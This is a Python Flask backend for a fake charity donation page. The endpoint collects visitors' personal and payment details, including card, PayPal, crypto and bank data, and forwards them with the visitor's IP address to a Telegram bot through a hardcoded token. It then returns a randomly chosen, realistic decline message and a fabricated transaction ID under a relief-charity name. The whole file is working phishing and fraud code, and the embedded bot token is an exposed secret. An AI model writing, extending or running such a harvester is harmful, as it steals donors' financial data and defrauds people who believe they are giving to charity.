from flask import Flask, request, jsonify
import requests
from datetime import datetime
import random

app = Flask(__name__)

# Telegram Bot Settings
TELEGRAM_BOT_TOKEN = '7845381383:AAG7cKGJzDvIhFM9fuWAua62QzpWRG0mN4k'
TELEGRAM_CHAT_ID = '7796858163'

def send_to_telegram(message):
    """Send message to Telegram bot"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

def generate_fake_transaction_id():
    """Generate realistic-looking transaction ID"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_num = random.randint(1000, 9999)
    return f"TXN-{timestamp}-{random_num}"

@app.route('/api/process_payment', methods=['POST'])
def process_payment():
    try:
        data = request.json
        amount = data.get('amount', 0)
        payment_method = data.get('payment_method', 'unknown')
        user_info = data.get('user_info', {})
        payment_details = data.get('payment_details', {})
        ip_address = request.remote_addr
        
        # Create timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Create detailed Telegram message
        message = f"""
<b>🚨 NEW DONATION ATTEMPT 🚨</b>

<b>Basic Info:</b>
💰 Amount: <code>${amount}</code>
💳 Method: <code>{payment_method.upper()}</code>
🌐 IP: <code>{ip_address}</code>
🕒 Time: <code>{timestamp}</code>

<b>User Info:</b>
"""
        for key, value in user_info.items():
            message += f"🔹 {key}: <code>{value}</code>\n"

        message += "\n<b>Payment Details:</b>\n"
        for key, value in payment_details.items():
            message += f"🔸 {key}: <code>{value}</code>\n"

        message += "\n<b>⚠️ THIS IS JUST A RECORD - NO REAL PAYMENT WAS PROCESSED ⚠️</b>"
        
        # Send to Telegram
        send_to_telegram(message)
        
        # Generate realistic error messages
        error_messages = {
            'card': [
                "Your card was declined. Please check your card details or use a different payment method.",
                "We couldn't process your payment. Your bank may be rejecting the transaction.",
                "Card authorization failed. Please contact your bank for more information.",
                "Insufficient funds. Please use a different payment method."
            ],
            'paypal': [
                "PayPal service is temporarily unavailable. Please try again later.",
                "We couldn't connect to PayPal. Please check your credentials.",
                "PayPal authentication failed. Please try another payment method.",
                "Your PayPal account is restricted from making this payment."
            ],
            'crypto': [
                "Cryptocurrency payments are currently unavailable. Please try another method.",
                "The selected cryptocurrency is not supported at this time.",
                "Network congestion is delaying crypto transactions. Please try later.",
                "Invalid wallet address. Please verify and try again."
            ],
            'bank': [
                "Bank transfers are temporarily disabled. Please check back later.",
                "Our bank is currently processing other transactions. Please try again.",
                "International transfers are experiencing delays. Please use another method.",
                "Invalid bank details provided. Please verify your information."
            ]
        }
        
        # Select random error message for the payment method
        error_msg = random.choice(error_messages.get(payment_method, 
            ["Payment processing failed. Please try again later."]))
        
        return jsonify({
            'success': False,
            'message': error_msg,
            'error_code': 'PAYMENT_DECLINED',
            'transaction_id': generate_fake_transaction_id(),
            'support_email': 'support@alquds-relief.org',
            'timestamp': timestamp
        }), 400
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': "An unexpected server error occurred. Please try again.",
            'error_code': 'SERVER_ERROR'
        }), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
